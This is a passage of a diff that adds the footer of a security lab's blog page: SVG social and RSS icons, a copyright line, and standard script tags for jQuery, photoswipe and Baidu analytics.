+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
